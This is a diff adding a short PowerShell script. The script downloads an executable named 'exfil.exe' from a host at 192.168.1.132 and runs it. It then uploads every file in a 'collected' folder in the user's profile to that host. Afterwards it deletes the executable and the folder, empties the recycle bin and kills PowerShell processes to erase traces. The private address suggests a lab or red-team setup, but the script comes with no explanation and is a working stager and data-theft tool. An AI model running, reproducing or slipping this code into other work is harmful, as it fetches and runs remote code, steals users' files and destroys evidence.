@@ -1,0 +1,18 @@
+$url = "http://192.168.1.132:5000/downloads/exfil.exe"; 
+$outputPath = "$($env:USERPROFILE)\Downloads\exfil.exe"; 
+Invoke-WebRequest -Uri $url -OutFile $outputPath; 
+Start-Process -FilePath $outputPath -Wait; 
+$serverUrl = "http://192.168.1.132:5000/uploads"; 
+$collectedFolderPath = "$($env:USERPROFILE)\Downloads\collected"; 
+$files = Get-ChildItem -Path $collectedFolderPath -File; 
+$client = New-Object System.Net.WebClient; 
+foreach ($file in $files) { 
+    $fileFullPath = $file.FullName; 
+    $client.UploadFile($serverUrl, $fileFullPath); 
+    Write-Host "File uploaded successfully: $fileFullPath"; 
+}
+Remove-Item -Path $outputPath -Force; 
+Remove-Item -Path $collectedFolderPath -Recurse -Force; 
+Clear-RecycleBin -Force; 
+Stop-Process -Name powershell -Force;
+
